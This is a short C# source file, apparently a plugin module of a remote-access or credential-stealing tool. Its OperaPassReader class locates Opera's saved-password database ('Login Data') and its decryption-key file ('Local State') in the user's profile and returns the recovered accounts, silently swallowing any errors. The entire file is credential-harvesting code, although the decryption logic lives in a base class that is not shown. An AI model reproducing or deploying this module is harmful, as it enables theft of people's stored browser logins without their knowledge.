

using InvokedCommon.Models;
using System;
using System.Collections.Generic;
using System.IO;


namespace Plugin.Helper.Browsers
{
	public class OperaPassReader : ChromiumBase
	{
		public override string ApplicationName => "Opera";

		public override IEnumerable<RecoveredAccount> ReadAccounts()
		{
			try
			{
				return (IEnumerable<RecoveredAccount>) this.ReadAccounts(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable\\Login Data"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable\\Local State"));
			}
			catch (Exception ex)
			{
				return (IEnumerable<RecoveredAccount>) new List<RecoveredAccount>();
			}
		}
	}
}
